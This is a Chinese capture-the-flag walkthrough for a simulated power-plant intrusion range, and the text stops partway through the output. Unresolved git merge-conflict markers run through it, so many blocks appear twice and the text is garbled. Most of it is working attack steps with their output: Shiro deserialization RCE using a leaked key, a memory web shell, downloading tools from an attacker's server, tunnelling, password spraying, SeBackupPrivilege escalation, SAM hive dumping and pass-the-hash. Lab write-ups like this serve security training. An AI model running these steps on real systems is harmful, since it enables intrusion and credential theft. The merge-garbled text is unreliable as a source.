---
title: 春秋云境 - ThermalPower
url: https://xz.aliyun.com/t/14088
<<<<<<< HEAD
clipped_at: 2024-03-20 09:39:19
=======
clipped_at: 2024-03-15 09:17:06
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
category: default
tags: 
 - xz.aliyun.com
---

# 春秋云境 - ThermalPower

- - -

title: ThermalPower  
<<<<<<< HEAD
description: 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源”公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。
=======
description: 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源”公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

## keywords: "内网渗透、Shiro、SCADA、工控安全"

## 前置知识

### 参考阅读

-   [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

### 知识点

-   Heapdump 内存泄露
-   Shiro 反序列化 RCE
-   Windows SeRestorePrivilege 提权
-   注册表 SAM 转储
-   .NET 逆向
-   RSA/AES 解密

### 工具

-   [https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)
-   [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
-   [https://github.com/SummerSec/ShiroAttack2](https://github.com/SummerSec/ShiroAttack2)
-   [https://github.com/fatedier/frp](https://github.com/fatedier/frp)
-   [https://github.com/fortra/impacket/](https://github.com/fortra/impacket/)
-   [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
-   [https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1)
-   [https://github.com/dnSpy/dnSpy/](https://github.com/dnSpy/dnSpy/)
-   [https://www.jetbrains.com/zh-cn/decompiler/](https://www.jetbrains.com/zh-cn/decompiler/)
-   [https://www.ssleye.com/ssltool/pem\_xml.html](https://www.ssleye.com/ssltool/pem_xml.html)
-   [https://www.lddgo.net/en/encrypt/rsa](https://www.lddgo.net/en/encrypt/rsa)

## 关卡描述

第一关：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
评估暴露在公网的服务的安全性，尝试建立通向生产区的立足点。
```

第二关：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。
```

第三关：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
尝试接管 SCADA 工程师站，并启动锅炉。
```

第四关：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
尝试获取 SCADA 工程师站中的数据库备份，并分析备份文件是否泄漏了敏感数据。
```

## 攻击路径

<<<<<<< HEAD
[![](assets/1710898759-16dbb837347b9078890a0041b010581f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104229-5589178c-e0e3-1.png)
=======
[![](assets/1710465426-16dbb837347b9078890a0041b010581f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104229-5589178c-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

## 入口 - 121.89.201.231 / 172.22.17.213

### Heapdump 内存泄露

fscan 外网信息收集：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
fscan -h 121.89.201.231 -nobr -np
-----
start infoscan
121.89.201.231:22 open
121.89.201.231:8080 open
[*] alive ports len is: 2
start vulscan
<<<<<<< HEAD
[*] WebTitle http://121.89.201.231:8080 code:302 len:0      title:None 跳转 url: http://121.89.201.231:8080/login;jsessionid=007467BA1E151515820545DC6111344D
=======
[*] WebTitle http://121.89.201.231:8080 code:302 len:0      title:None 跳转 url: http://121.89.201.231:8080/login;jsessionid=007467BA1E151515820545DC6111344D
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
[*] WebTitle http://121.89.201.231:8080/login;jsessionid=007467BA1E151515820545DC6111344D code:200 len:2936   title:火创能源监控画面管理平台
[+] PocScan http://121.89.201.231:8080 poc-yaml-spring-actuator-heapdump-file 
[+] PocScan http://121.89.201.231:8080 poc-yaml-springboot-env-unauth spring2
已完成 2/2                                 
<<<<<<< HEAD
[*] 扫描结束，耗时：19.0686916s
=======
[*] 扫描结束，耗时：19.0686916s
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
```

dirsearch 扫描目录：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
python dirsearch.py -u http://121.89.201.231:8080/ -w "D:\Software\H
ackTools\Dict\Fuzzzzzz\fingerprint\spring.txt"
-----

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 70

Output File: D:\Software\HackTools\Reconnaissance\Brute Force\dirsearch_0.4.3\reports\http_121.89.201.231_8080\__24-03-04_13-44-30.txt      

Target: http://121.89.201.231:8080/

[13:44:30] Starting: 
[13:44:32] 200 -    2KB - /actuator                                        
[13:44:32] 404 -  109B  - /actuator/auditevents                            
[13:44:32] 200 -    2B  - /actuator/info
[13:44:32] 200 - 1018B  - /actuator/metrics                                
[13:44:32] 200 -   54B  - /actuator/scheduledtasks                       
[13:44:32] 404 -  105B  - /actuator/jolokia
[13:44:32] 200 -    6KB - /actuator/env
[13:44:32] 404 -  105B  - /actuator/refresh
[13:44:32] 404 -  112B  - /actuator/hystrix.stream
[13:44:32] 404 -  107B  - /actuator/httptrace
[13:44:32] 200 -  167B  - /actuator/health                                 
[13:44:32] 200 -   91KB - /actuator/beans                                   
[13:44:32] 200 -   49KB - /actuator/loggers                                 
[13:44:32] 200 -   22KB - /actuator/mappings                                
[13:44:32] 200 -   99KB - /actuator/conditions                              
[13:44:32] 200 -   14KB - /actuator/configprops
[13:44:33] 200 -  234KB - /actuator/threaddump
[13:44:34] 200 -   31MB - /actuator/heapdump
```

<<<<<<< HEAD
[![](assets/1710898759-29e3b426d1a80605b12f8aea18308749.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104248-60c08004-e0e3-1.png)

下载 heapdump 内存泄漏文件（Github 上 heapdump 相关工具很多，随意下载一个即可）：

```plain
=======
[![](assets/1710465426-29e3b426d1a80605b12f8aea18308749.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104248-60c08004-e0e3-1.png)

下载 heapdump 内存泄漏文件（Github 上 heapdump 相关工具很多，随意下载一个即可）：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://121.89.201.231:8080/actuator/heapdump
```

从内存文件中提取信息：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
java -jar heapdump.jar "C:\Users\47236\Desktop\heapdump" > 1.txt
```

结果中存在 Shiro key，可以尝试 Shiro 反序列化：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES

===========================================
```

### Shiro 反序列化 RCE

找到构造链：

<<<<<<< HEAD
```plain
URL: http://121.89.201.231:8080
SHIRO KEY: QZYysgMYhG6/CzIJlVpR2g==
构造链：CommonsBeanutils1  
回显方式：AllEcho
```

[![](assets/1710898759-6d53fd53c873db32915f95aaf1c5c255.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104300-6802edfc-e0e3-1.png)

注入内存马：

```plain
冰蝎[Filter]  注入成功！
=======
```bash
URL: http://121.89.201.231:8080
SHIRO KEY: QZYysgMYhG6/CzIJlVpR2g==
构造链：CommonsBeanutils1  
回显方式：AllEcho
```

[![](assets/1710465426-6d53fd53c873db32915f95aaf1c5c255.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104300-6802edfc-e0e3-1.png)

注入内存马：

```bash
冰蝎[Filter]  注入成功！
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
路径：http://121.89.201.231:8080/favicondemo.ico
密码：pass1024
```

连接内存马，得到 flag01：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
/ >find / -name flag*
/flag01.txt

/ >cat /flag01.txt
   ████  ██                    ████   ██ 
  ░██░  ░██            █████  █░░░██ ███ 
 ██████ ░██  ██████   ██░░░██░█  █░█░░██ 
░░░██░  ░██ ░░░░░░██ ░██  ░██░█ █ ░█ ░██ 
  ░██   ░██  ███████ ░░██████░██  ░█ ░██ 
  ░██   ░██ ██░░░░██  ░░░░░██░█   ░█ ░██ 
  ░██   ███░░████████  █████ ░ ████  ████
  ░░   ░░░  ░░░░░░░░  ░░░░░   ░░░░  ░░░░ 


flag01: flag{b5b1729d-3c03-4bb1-bb9c-056b2e68975f}
```

<<<<<<< HEAD
[![](assets/1710898759-2cde70eed1fb9faf1c4550b59015bb13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104306-6bd2152a-e0e3-1.png)
=======
[![](assets/1710465426-2cde70eed1fb9faf1c4550b59015bb13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104306-6bd2152a-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 信息收集

查看网络信息：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
/ >ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.17.213  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe14:4964  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:14:49:64  txqueuelen 1000  (Ethernet)
        RX packets 87190  bytes 109444938 (109.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28006  bytes 40437457 (40.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 628  bytes 53814 (53.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 628  bytes 53814 (53.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`curl ip.info` 测试是否出网。可访问互联网，上传 fscan：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
# YOUR-VPS
python3 -m http.server <YOUR-VPS-PORT>
```

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
# 172.22.17.213
curl http://<YOUR-VPS-IP>:<YOUR-VPS-PORT>/fscan --output fscan
chmod +x ./fscan
```

fscan 内网信息收集：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
./fscan -h 172.22.17.213/24 -np -nobr
-----
172.22.17.213:8080 open
172.22.17.6:445 open
172.22.17.6:139 open
172.22.17.6:135 open
172.22.17.6:80 open
172.22.17.6:21 open
172.22.17.213:22 open
<<<<<<< HEAD
[*] WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转 url: http://172.22.17.213:8080/login;jsessionid=6F1E3BB703935624E3EF2C176AA6F913
=======
[*] WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转 url: http://172.22.17.213:8080/login;jsessionid=6F1E3BB703935624E3EF2C176AA6F913
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
[*] NetInfo 
[*]172.22.17.6
   [->]WIN-ENGINEER
   [->]172.22.17.6
[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER        
[*] WebTitle http://172.22.17.213:8080/login;jsessionid=6F1E3BB703935624E3EF2C176AA6F913 code:200 len:2936   title:火创能源监控画面管理平台
[+] ftp 172.22.17.6:21:anonymous 
   [->]Modbus
   [->]PLC
   [->]web.config
   [->]WinCC
   [->]内部软件
   [->]火创能源内部资料
[*] WebTitle http://172.22.17.6        code:200 len:661    title:172.22.17.6 - /
[+] PocScan http://172.22.17.213:8080 poc-yaml-spring-actuator-heapdump-file 
[+] PocScan http://172.22.17.213:8080 poc-yaml-springboot-env-unauth spring2
```

提取关键资产：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER
```

### 内网代理

frp 内网代理：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
# frp_0.53.2
curl http://<YOUR-VPS-IP>:<YOUR-VPS-PORT>/frpc --output frpc
curl http://<YOUR-VPS-IP>:<YOUR-VPS-PORT>/frpc.toml --output frpc.toml
chmod +x frpc
nohup ./frpc -c frpc.toml &
```

<<<<<<< HEAD
frps.toml：

```plain
=======
frps.toml:

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
bindAddr="0.0.0.0"
bindPort = <YOUR-VPS-PORT>
auth.method = "token"
auth.token = "<YOUR-AUTH-TOKEN>"
```

<<<<<<< HEAD
frpc.toml:

```plain
=======
frpc.toml:

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
serverAddr = "<YOUR-VPS-IP>"
serverPort = <YOUR-VPS-PORT>
auth.method = "token"
auth.token = "<YOUR-AUTH-TOKEN>"

[[proxies]]
name = "plugin_socks5"
type = "tcp"
remotePort = <YOUR-REMOTE-PORT>
[proxies.plugin]
type = "socks5"
username = "REKIUR-USER-PASS>"
password = "<YOUR-USER-PASS>"
```

## 172.22.17.6 - WIN-ENGINEER

### 敏感信息泄露

`172.22.17.6` 存在敏感信息泄露：

<<<<<<< HEAD
[![](assets/1710898759-82d976e8bd680eeecf783e863f6009d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104317-726bf6ee-e0e3-1.png)

在内部资料中得到 `WIN-SCADA` 的管理员账号密码：

```plain
=======
[![](assets/1710465426-82d976e8bd680eeecf783e863f6009d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104317-726bf6ee-e0e3-1.png)

在内部资料中得到 `WIN-SCADA` 的管理员账号密码：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://172.22.17.6/火创能源内部资料/SCADA.txt
-----
WIN-SCADA: 172.22.26.xx
Username: Administrator
Password: IYnT3GyCiy3
```

<<<<<<< HEAD
[![](assets/1710898759-6b86875cd02f4ce204d6e14f89b7ccd4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104324-76518382-e0e3-1.png)

其他资料（内部通知 + 内部通讯录）里包含关键信息（初始密码组成方式）：

```plain
1. 登陆权限限制：
   为确保信息系统的安全性，自即日起，公司所有工程师 PC 的登陆将由 SCADA 工程师进行控制。请各位工程师注意，只能通过 SCADA 工程师提供的登陆方式进行访问。

2. 登陆账户设置：
   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为 zhangsan，工号为 0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。
=======
[![](assets/1710465426-6b86875cd02f4ce204d6e14f89b7ccd4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104324-76518382-e0e3-1.png)

其他资料（内部通知 + 内部通讯录）里包含关键信息（初始密码组成方式）：

```bash
1. 登陆权限限制：
   为确保信息系统的安全性，自即日起，公司所有工程师 PC 的登陆将由 SCADA 工程师进行控制。请各位工程师注意，只能通过 SCADA 工程师提供的登陆方式进行访问。

2. 登陆账户设置：
   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为 zhangsan，工号为 0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
```

在内部通讯录中提取 SCADA 工程师信息：

<<<<<<< HEAD
[![](assets/1710898759-8fc4ad66e081f13a837a74af6b4de7d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104330-7a07c798-e0e3-1.png)

根据内部通知的初始密码规则，得到 SCADA 工程师的账号密码如下：

```plain
=======
[![](assets/1710465426-8fc4ad66e081f13a837a74af6b4de7d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104330-7a07c798-e0e3-1.png)

根据内部通知的初始密码规则，得到 SCADA 工程师的账号密码如下：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
chenhua/chenhua@0813
zhaoli/zhaoli@0821
wangning/wangning@0837
zhangling/zhangling@0871
zhangying/zhangying@0888
wangzhiqiang/wangzhiqiang@0901
chentao/chentao@0922
zhouyong/zhouyong@0939
lilong/lilong@1046
liyumei/liyumei@1048
```

impacket 验证（报错 rpc\_s\_access\_denied）：

<<<<<<< HEAD
```plain
python wmiexec.py chenhua:"chenhua@0813"@172.22.17.6 -codec gbk
```

[![](assets/1710898759-7c5eb748467529d6a947453c64cdfc84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104336-7d780df2-e0e3-1.png)
=======
```bash
python wmiexec.py chenhua:"chenhua@0813"@172.22.17.6 -codec gbk
```

[![](assets/1710465426-7c5eb748467529d6a947453c64cdfc84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104336-7d780df2-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

> \[!NOTE\] rpc\_s\_access\_denied  
> 在只知道 NTLM Hash 的情况下，只有 RID 为 500 的管理员用户才能绕过 UAC 成功执行 PTH；若 RID 不是 500，即便是在本地管理员用户组里也无法执行 PTH。

chenhua 账号 rdp 登录：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER
```

当前账号为普通用户权限，不出网，需要提权：

<<<<<<< HEAD
[![](assets/1710898759-1bd1b92875fb8c43217dcf687fd52c10.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104344-8299f2fa-e0e3-1.png)
=======
[![](assets/1710465426-1bd1b92875fb8c43217dcf687fd52c10.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104344-8299f2fa-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 权限提升

#### 方法 1 SeBackupPrivilege 提权

> \[!NOTE\] 使用 SeBackupPrivilege 权限实现权限提升
> 
> -   SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。diskshadow 是 Windows 的内置功能，可以帮助创建备份。参考 [hackingarticles](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)，可以在本地或 DC 进行权限提升。
>     -   Privilege 靶场中也使用该方式实现权限提升。ThermalPower 只涉及本地权限提升，不涉及 DC。

查看 systeminfo：

<<<<<<< HEAD
```plain
C:\Users\chenhua>systeminfo

主机名：WIN-ENGINEER
OS 名称：Microsoft Windows Server 2022 Datacenter
OS 版本：10.0.20348 暂缺 Build 20348
OS 制造商：Microsoft Corporation
OS 配置：独立服务器
OS 构建类型：Multiprocessor Free
注册的所有人：
注册的组织：Aliyun
产品 ID:          00454-60000-00001-AA888
初始安装日期：2023/12/25, 20:35:07
系统启动时间：2024/3/4, 13:41:17
系统制造商：Alibaba Cloud
系统型号：Alibaba Cloud ECS
系统类型：x64-based PC
处理器：安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS 版本：SeaBIOS 449e491, 2014/4/1
Windows 目录：C:\Windows
系统目录：C:\Windows\system32
启动设备：        \Device\HarddiskVolume1
系统区域设置：zh-cn;中文 (中国)
输入法区域设置：zh-cn;中文 (中国)
时区：            (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量：3,950 MB
可用的物理内存：2,137 MB
虚拟内存：最大值：5,358 MB
虚拟内存：可用：3,600 MB
虚拟内存：使用中：1,758 MB
页面文件位置：C:\pagefile.sys
域：WORKGROUP
登录服务器：      \\WIN-ENGINEER
修补程序：安装了 3 个修补程序。
                  [01]: KB5031993
                  [02]: KB5032198
                  [03]: KB5032310
网卡：安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名：以太网
                      启用 DHCP:   是
                      DHCP 服务器：172.22.255.253
                      IP 地址
                        [01]: 172.22.17.6
                        [02]: fe80::6ee2:423a:4d01:5191
Hyper-V 要求：已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
=======
```bash
C:\Users\chenhua>systeminfo

主机名：WIN-ENGINEER
OS 名称：Microsoft Windows Server 2022 Datacenter
OS 版本：10.0.20348 暂缺 Build 20348
OS 制造商：Microsoft Corporation
OS 配置：独立服务器
OS 构建类型：Multiprocessor Free
注册的所有人：
注册的组织：Aliyun
产品 ID:          00454-60000-00001-AA888
初始安装日期：2023/12/25, 20:35:07
系统启动时间：2024/3/4, 13:41:17
系统制造商：Alibaba Cloud
系统型号：Alibaba Cloud ECS
系统类型：x64-based PC
处理器：安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS 版本：SeaBIOS 449e491, 2014/4/1
Windows 目录：C:\Windows
系统目录：C:\Windows\system32
启动设备：        \Device\HarddiskVolume1
系统区域设置：zh-cn;中文 (中国)
输入法区域设置：zh-cn;中文 (中国)
时区：            (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量：3,950 MB
可用的物理内存：2,137 MB
虚拟内存：最大值：5,358 MB
虚拟内存：可用：3,600 MB
虚拟内存：使用中：1,758 MB
页面文件位置：C:\pagefile.sys
域：WORKGROUP
登录服务器：      \\WIN-ENGINEER
修补程序：安装了 3 个修补程序。
                  [01]: KB5031993
                  [02]: KB5032198
                  [03]: KB5032310
网卡：安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名：以太网
                      启用 DHCP:   是
                      DHCP 服务器：172.22.255.253
                      IP 地址
                        [01]: 172.22.17.6
                        [02]: fe80::6ee2:423a:4d01:5191
Hyper-V 要求：已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
```

查看特权信息，此时 SeBackupPrivilege 未开启：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
PS C:\Windows\system32> whoami /priv

特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeBackupPrivilege             备份文件和目录 已禁用
SeRestorePrivilege            还原文件和目录 已禁用
SeShutdownPrivilege           关闭系统       已禁用
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用
```

此时访问 Administrator 目录，提示拒绝访问：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
PS C:\Windows\system32> dir C:\Users\Administrator\flag\
dir : 拒绝访问。
```

使用 [EnableSeBackupPrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1) 启用 SeBackupPrivilege：

<<<<<<< HEAD
```plain
Import-Module .\EnableSeBackupPrivilege.ps1
```

[![](assets/1710898759-2cf257b06f39fb2f0b987b607529971c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104353-87ede09a-e0e3-1.png)

新建 s.dsh 文件，创建目标系统上 C 盘的备份：

```plain
=======
```bash
Import-Module .\EnableSeBackupPrivilege.ps1
```

[![](assets/1710465426-2cf257b06f39fb2f0b987b607529971c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104353-87ede09a-e0e3-1.png)

新建 s.dsh 文件，创建目标系统上 C 盘的备份：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% z:
```

将 s.dsh 文件编码和间距转换为与 Windows 机器兼容形式（在 Windows 上新建 s.dsh 可忽略此步）：

<<<<<<< HEAD
```plain
unix2dos s.dsh
```

以管理员权限在 PowerShell 中执行命令。当前用户路径权限不够，需要在 C 盘新建目录 Temp，执行 diskshadow 并拷贝 flag02 ：

```plain
=======
```bash
unix2dos s.dsh
```

以管理员权限在 PowerShell 中执行命令。当前用户路径权限不够，需要在 C 盘新建目录 Temp，执行 diskshadow 并拷贝 flag02：

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
PS C:\Users\chenhua\Desktop> cd C:\
PS C:\Users\chenhua\Desktop> mkdir Temp
PS C:\Temp> diskshadow /s s.dsh
PS C:\Temp> dir z:\Users\Administrator\flag\
PS C:\Temp> robocopy /b z:\Users\Administrator\flag\ . flag02.txt
```

得到 flag02：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
_____.__                 _______   ________  
_/ ____\  | _____     ____ \   _  \  \_____  \ 
\   __\|  | \__  \   / ___\/  /_\  \  /  ____/ 
 |  |  |  |__/ __ \_/ /_/  >  \_/   \/       \ 
 |__|  |____(____  /\___  / \_____  /\_______ \
                 \//_____/        \/         \/

flag02: flag{9086c9a7-0f32-4c7a-a29e-ce3ca30465d9}
```

<<<<<<< HEAD
[![](assets/1710898759-a34dd96df76c61a6a9c3b6b381b2c748.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104401-8c5030d4-e0e3-1.png)
=======
[![](assets/1710465426-a34dd96df76c61a6a9c3b6b381b2c748.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104401-8c5030d4-e0e3-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

#### 方法 2 注册表 SAM 转储

重置环境，尝试直接转储 sam 和 system，发现不需要特权即可以成功导出：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
PS C:\Users\chenhua\Desktop> cd C:\
PS C:\Users\chenhua\Desktop> mkdir Temp
PS C:\Users\chenhua\Desktop> cd C:\Temp
PS C:\Temp> reg save hklm\sam c:\Temp\sam
PS C:\Temp> reg save hklm\system c:\Temp\system
```

下载到本地，提取 Administrator 的 NTLM hash：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
python secretsdump.py -sam sam -system system LOCAL
-----
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6c2be46aaccdf65a9b7be2941d6e7759
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::
chentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::
zhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::
wangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::
zhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::
zhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::
lilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::
liyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::
wangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::
zhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::
[*] Cleaning up...
```

以管理员权限登录获得 flag02：

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
python wmiexec.py administrator@172.22.17.6 -hashes :f82292b7ac79b05d5b0e3d302bd0d279 -codec gbk
-----
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd C:\Users\Administrator\flag
C:\Users\Administrator\flag>dir
 驱动器 C 中的卷没有标签。
 卷的序列号是 C02E-FBD8

 C:\Users\Administrator\flag 的目录

2023/12/25  23:49    <DIR>          .
2024/03/05  10:19    <DIR>          ..
2024/03/05  10:11               350 flag02.txt
               1 个文件            350 字节
